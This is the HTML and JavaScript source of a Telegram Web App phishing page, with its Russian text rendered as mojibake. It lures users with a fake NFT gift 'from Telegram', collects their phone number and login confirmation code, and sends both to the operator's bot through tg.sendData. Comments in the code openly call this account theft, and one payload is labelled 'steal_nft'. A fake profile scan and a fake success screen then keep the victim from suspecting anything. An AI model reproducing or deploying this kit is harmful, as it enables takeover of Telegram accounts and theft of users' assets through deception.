<!DOCTYPE html>
<html>
<head>
    <title>üéÅ –ü–æ–ª—É—á–∏—Ç–µ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫!</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π –¥–∏–∑–∞–π–Ω –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π –¥–æ–≤–µ—Ä—á–∏–≤–æ—Å—Ç–∏ */
        :root {
            --tg-theme-bg-color: #1a1a2e;
            --tg-theme-text-color: #ffffff;
            --gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        body {
            margin: 0;
            padding: 20px;
            background: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            padding: 30px 0;
        }

        .gift-animation {
            font-size: 80px;
            animation: pulse 2s infinite;
            margin-bottom: 20px;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transfo—ärm: scale(1.1); }
            100% { transform: scale(1); }
        }

        .step {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: none;
            animation: slideIn 0.5s ease;
        }

        .step.active {
            display: block;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .input-group {
            margin: 20px 0;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            opacity: 0.8;
        }

        input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            border: 2px solid transparent;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            background: rgba(102, 126, 234, 0.1);
        }

        .btn {
            width: 100%;
            padding: 18px;
            background: var(--gradient);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin: 10px 0;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .loader {
            display: none;
            text-align: center;
            padding: 30px;
        }

        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            border-left-color: #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .scan-step {
            text-align: center;
        }

        .scan-item {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            animation: itemAppear 0.5s ease forwards;
            opacity: 0;
        }

        @keyframes itemAppear {
            to { opacity: 1; }
        }

        .scan-icon {
            font-size: 24px;
            margin-right: 15px;
            width: 40px;
        }

        .scan-text {
            flex: 1;
            text-align: left;
        }

        .checkmark {
            color: #00ff00;
            font-size: 20px;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: var(--gradient);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 3px;
        }

        /* –§–æ–Ω–æ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ—Å—Ç–∏ */
        .bg-elements {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .bg-element {
            position: absolute;
            font-size: 100px;
            opacity: 0.05;
            animation: float 20s infinite linear;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); }
            100% { transform: translateY(-1000px) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="bg-elements" id="bgElements">
        <!-- NFT —Å–∏–º–≤–æ–ª—ã –Ω–∞ —Ñ–æ–Ω–µ -->
    </div>

    <div class="container">
        <!-- –®–∞–≥ 1: –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ -->
        <div class="step active" id="step1">
            <div class="header">
                <div class="gift-animation">üéÅ</div>
                <h1>–ü–û–ó–î–†–ê–í–õ–Ø–ï–ú!</h1>
                <p>–í—ã –ø–æ–ª—É—á–∏–ª–∏ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫ –æ—Ç Telegram</p>
                <p>–≠—Ç–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ü–∏—Ñ—Ä–æ–≤–æ–π –∞–∫—Ç–∏–≤, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –ø–µ—Ä–µ–ø—Ä–æ–¥–∞—Ç—å!</p>
            </div>

            <div style="background: rgba(255,215,0,0.1); padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid rgba(255,215,0,0.3);">
                <strong>üí∞ –û–¶–ï–ù–ö–ê –°–¢–û–ò–ú–û–°–¢–ò:</strong>
                <p style="color: #FFD700; font-size: 24px; margin: 10px 0;">~1.5 - 2 TON</p>
                <p style="font-size: 12px; opacity: 0.8;">(~233‚ÇΩ - 311‚ÇΩ –Ω–∞ —Ç–µ–∫—É—â–∏–π –º–æ–º–µ–Ω—Ç)</p>
            </div>

            <button class="btn" onclick="showStep(2)">
                üöÄ –ü–û–õ–£–ß–ò–¢–¨ NFT
            </button>

            <p style="text-align: center; font-size: 12px; opacity: 0.6; margin-top: 20px;">
                üîí –î–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º
            </p>
        </div>

        <!-- –®–∞–≥ 2: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ -->
        <div class="step" id="step2">
            <h2>üîê –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–ï –ê–ö–ö–ê–£–ù–¢–ê</h2>
            <p>–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è NFT –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</p>

            <div class="input-group">
                <label>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ Telegram:</label>
                <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" pattern="\+7[0-9]{10}">
                <div style="font-size: 12px; opacity: 0.7; margin-top: 5px;">
                    –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ –±–æ—Ç–∞
                </div>
            </div>

            <button class="btn" onclick="sendPhone()">
                üì± –ü–û–õ–£–ß–ò–¢–¨ –ö–û–î –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø
            </button>

            <button class="btn" onclick="showStep(1)" style="background: transparent; border: 2px solid #667eea;">
                ‚Üê –ù–ê–ó–ê–î
            </button>
        </div>

        <!-- –®–∞–≥ 3: –í–≤–æ–¥ –∫–æ–¥–∞ -->
        <div class="step" id="step3">
            <h2>üì≤ –ö–û–î –ò–ó TELEGRAM</h2>
            <p>–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –≤ Telegram</p>
            <p style="font-size: 14px; opacity: 0.8;">–û–±—ã—á–Ω–æ –ø—Ä–∏—Ö–æ–¥–∏—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 10-30 —Å–µ–∫—É–Ω–¥</p>

            <div class="input-group">
                <label>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:</label>
                <input type="text" id="code" placeholder="12345" pattern="[0-9]{5}" maxlength="5">
                <div id="codeTimer" style="font-size: 12px; opacity: 0.7; margin-top: 5px;">
                    –ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: 04:59
                </div>
            </div>

            <button class="btn" onclick="verifyCode()">
                ‚úÖ –ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ö–û–î
            </button>

            <button class="btn" onclick="resendCode()" style="background: transparent; border: 2px solid #764ba2;">
                üîÑ –û–¢–ü–†–ê–í–ò–¢–¨ –ö–û–î –ï–©–ï –†–ê–ó
            </button>
        </div>

        <!-- –®–∞–≥ 4: –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ñ–∏–ª—è -->
        <div class="step scan-step" id="step4">
            <h2>üîç –°–ö–ê–ù–ò–†–£–ï–ú –í–ê–® –ü–†–û–§–ò–õ–¨</h2>
            <p>–ò—â–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ NFT –ø–æ–¥–∞—Ä–∫–∏ –∏ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –∞–∫—Ç–∏–≤—ã...</p>

            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>

            <div id="scanItems">
                <!-- –ü—É–Ω–∫—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –¥–æ–±–∞–≤–ª—è—é—Ç—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ -->
            </div>

            <div id="foundResults" style="display: none;">
                <div style="background: rgba(0,255,0,0.1); padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #00ff00;">
                    <strong style="color: #00ff00;">‚úÖ –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï –ó–ê–í–ï–†–®–ï–ù–û!</strong>
                    <p id="foundCount">–ù–∞–π–¥–µ–Ω–æ: 0 NFT</p>
                </div>
            </div>
        </div>

        <!-- –®–∞–≥ 5: –£—Å–ø–µ—Ö -->
        <div class="step" id="step5">
            <div class="header">
                <div class="gift-animation" style="color: #00ff00;">üéâ</div>
                <h1>NFT –£–°–ü–ï–®–ù–û –ü–û–õ–£–ß–ï–ù–´!</h1>
                <p>–í—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –∞–∫—Ç–∏–≤—ã –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω—ã –≤ –≤–∞—à –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å</p>
            </div>

            <div style="background: rgba(102,126,234,0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                <h3>üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´:</h3>
                <div id="resultsList">
                    <!-- –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –¥–æ–±–∞–≤–ª—è—é—Ç—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ -->
                </div>
            </div>

            <button class="btn" onclick="openInventory()" style="background: linear-gradient(45deg, #00ff00, #00cc00);">
                üì¶ –û–¢–ö–†–´–¢–¨ –ò–ù–í–ï–ù–¢–ê–†–¨
            </button>

            <p style="text-align: center; font-size: 12px; opacity: 0.6; margin-top: 20px;">
                NFT –ø–æ–¥–∞—Ä–∫–∏ —É–∂–µ –¥–æ—Å—Ç—É–ø–Ω—ã –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∏ –ø—Ä–æ–¥–∞–∂–∏
            </p>
        </div>

        <!-- –õ–æ–∞–¥–µ—Ä -->
        <div class="loader" id="loader">
            <div class="spinner"></div>
            <p id="loaderText">–ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–∞–Ω–Ω—ã–µ...</p>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.BackButton.hide();

        let currentStep = 1;
        let userPhone = '';
        let giftCode = new URLSearchParams(window.location.search).get('code');
        let scanItems = [
            { icon: 'üë§', text: '–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ—Ñ–∏–ª—è...', delay: 500 },
            { icon: 'üé®', text: '–ü–æ–∏—Å–∫ —Å—Ç–∏–∫–µ—Ä–ø–∞–∫–æ–≤...', delay: 1500 },
            { icon: '‚ú®', text: '–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–Ω–∏–º–∞—Ü–∏–π...', delay: 2500 },
            { icon: 'üíé', text: '–ü–æ–∏—Å–∫ –ø—Ä–µ–º–∏—É–º –∫–æ–Ω—Ç–µ–Ω—Ç–∞...', delay: 3500 },
            { icon: 'üèÜ', text: '–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–π...', delay: 4500 },
            { icon: 'üéÅ', text: '–°–±–æ—Ä NFT –ø–æ–¥–∞—Ä–∫–æ–≤...', delay: 5500 }
        ];

        // –°–æ–∑–¥–∞–µ–º —Ñ–æ–Ω –∏–∑ NFT —Å–∏–º–≤–æ–ª–æ–≤
        function createBackground() {
            const bg = document.getElementById('bgElements');
            const symbols = ['üéÅ', 'üíé', '‚ú®', 'üåü', '‚≠ê', 'üé®', 'üèÜ', 'üéó', 'üéÄ', 'üéä'];

            for (let i = 0; i < 20; i++) {
                const el = document.createElement('div');
                el.className = 'bg-element';
                el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                el.style.left = Math.random() * 100 + '%';
                el.style.top = Math.random() * 100 + '%';
                el.style.fontSize = (20 + Math.random() * 80) + 'px';
                el.style.animationDuration = (10 + Math.random() * 30) + 's';
                el.style.animationDelay = Math.random() * 5 + 's';
                bg.appendChild(el);
            }
        }

        function showStep(step) {
            document.getElementById(`step${currentStep}`).classList.remove('active');
            document.getElementById(`step${step}`).classList.add('active');
            currentStep = step;

            if (step === 4) {
                startProfileScan();
            }

            // –í–∏–±—Ä–∞—Ü–∏—è –¥–ª—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ—Å—Ç–∏
            if (step !== 1 && tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('light');
            }
        }

        function showLoader(text) {
            document.getElementById('loaderText').textContent = text;
            document.getElementById('loader').style.display = 'block';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function sendPhone() {
            userPhone = document.getElementById('phone').value;

            if (!userPhone.match(/^\+7[0-9]{10}$/)) {
                alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +7XXXXXXXXXX');
                return;
            }

            showLoader('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è...');

            // –ò–º–∏—Ç–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞
            setTimeout(() => {
                hideLoader();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä –Ω–∞ —Å–µ—Ä–≤–µ—Ä (–¥–ª—è –∫—Ä–∞–∂–∏)
                tg.sendData(JSON.stringify({
                    action: 'request_code',
                    phone: userPhone,
                    gift_code: giftCode
                }));

                // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –∫–æ–¥–∞
                startCodeTimer();

                showStep(3);
            }, 1500);
        }

        let codeTimer;
        let codeTimeLeft = 299; // 4 –º–∏–Ω—É—Ç—ã 59 —Å–µ–∫—É–Ω–¥

        function startCodeTimer() {
            const timerElement = document.getElementById('codeTimer');

            codeTimer = setInterval(() => {
                const minutes = Math.floor(codeTimeLeft / 60);
                const seconds = codeTimeLeft % 60;

                timerElement.textContent = `–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                if (codeTimeLeft <= 0) {
                    clearInterval(codeTimer);
                    timerElement.textContent = '‚ùå –ö–æ–¥ –∏—Å—Ç–µ–∫';
                    timerElement.style.color = '#ff0000';
                } else if (codeTimeLeft <= 30) {
                    timerElement.style.color = '#ffaa00';
                }

                codeTimeLeft--;
            }, 1000);
        }

        function verifyCode() {
            const code = document.getElementById('code').value;

            if (!code.match(/^[0-9]{5}$/)) {
                alert('–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                return;
            }

            showLoader('–ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥...');

            setTimeout(() => {
                hideLoader();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –∫—Ä–∞–∂–∏ –∞–∫–∫–∞—É–Ω—Ç–∞
                tg.sendData(JSON.stringify({
                    action: 'steal_nft',
                    phone: userPhone,
                    code: code,
                    gift_code: giftCode
                }));

                showStep(4);
            }, 2000);
        }

        function resendCode() {
            showLoader('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π –∫–æ–¥...');

            setTimeout(() => {
                hideLoader();
                alert('‚úÖ –ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!');

                // –°–±—Ä–æ—Å —Ç–∞–π–º–µ—Ä–∞
                clearInterval(codeTimer);
                codeTimeLeft = 299;
                startCodeTimer();
            }, 1000);
        }

        function startProfileScan() {
            const scanContainer = document.getElementById('scanItems');
            const progressFill = document.getElementById('progressFill');
            scanContainer.innerHTML = '';

            let completed = 0;

            scanItems.forEach((item, index) => {
                setTimeout(() => {
                    const scanItem = document.createElement('div');
                    scanItem.className = 'scan-item';
                    scanItem.style.animationDelay = (index * 0.1) + 's';

                    scanItem.innerHTML = `
                        <div class="scan-icon">${item.icon}</div>
                        <div class="scan-text">${item.text}</div>
                        <div class="checkmark">‚åõ</div>
                    `;

                    scanContainer.appendChild(scanItem);

                    // –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è
                    setTimeout(() => {
                        scanItem.style.opacity = '1';
                    }, 10);

                    // –û—Ç–º–µ—Ç–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ delay
                    setTimeout(() => {
                        scanItem.querySelector('.checkmark').textContent = '‚úÖ';
                        completed++;

                        // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä
                        const progress = (completed / scanItems.length) * 100;
                        progressFill.style.width = progress + '%';

                        // –ï—Å–ª–∏ –≤—Å–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ
                        if (completed === scanItems.length) {
                            setTimeout(() => {
                                document.getElementById('foundResults').style.display = 'block';

                                // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ "–Ω–∞–π–¥–µ–Ω–Ω—ã—Ö" NFT
                                const foundCount = 3 + Math.floor(Math.random() * 12);
                                document.getElementById('foundCount').textContent = `–ù–∞–π–¥–µ–Ω–æ: ${foundCount} NFT –ø–æ–¥–∞—Ä–∫–æ–≤`;

                                // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ—Ö–æ–¥ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                                setTimeout(() => showStep(5), 2000);
                            }, 1000);
                        }
                    }, item.delay);

                }, index * 500);
            });
        }

        function openInventory() {
            // –û—Ç–∫—Ä—ã–≤–∞–µ–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å —á–µ—Ä–µ–∑ –±–æ—Ç–∞
            tg.openTelegramLink('https://t.me/your_bot?start=inventory');
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        createBackground();

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –æ—Ç –±–æ—Ç–∞
        tg.onEvent('webAppDataReceived', (data) => {
            try {
                const parsed = JSON.parse(data);

                if (parsed.action === 'scan_complete') {
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
                    const resultsList = document.getElementById('resultsList');
                    resultsList.innerHTML = '';

                    parsed.results.forEach(result => {
                        const item = document.createElement('div');
                        item.style.margin = '10px 0';
                        item.style.padding = '10px';
                        item.style.background = 'rgba(255,255,255,0.05)';
                        item.style.borderRadius = '5px';

                        item.innerHTML = `
                            <strong>${result.type}</strong>: ${result.count} —à—Ç.
                            <div style="font-size: 12px; opacity: 0.8;">${result.description}</div>
                        `;

                        resultsList.appendChild(item);
                    });
                }
            } catch (e) {
                console.error('Error parsing data:', e);
            }
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–±—ã—Ç–∏–µ –æ—Ç–∫—Ä—ã—Ç–∏—è
        tg.sendData(JSON.stringify({
            action: 'page_loaded',
            gift_code: giftCode,
            timestamp: new Date().toISOString()
        }));
    </script>
</body>
</html>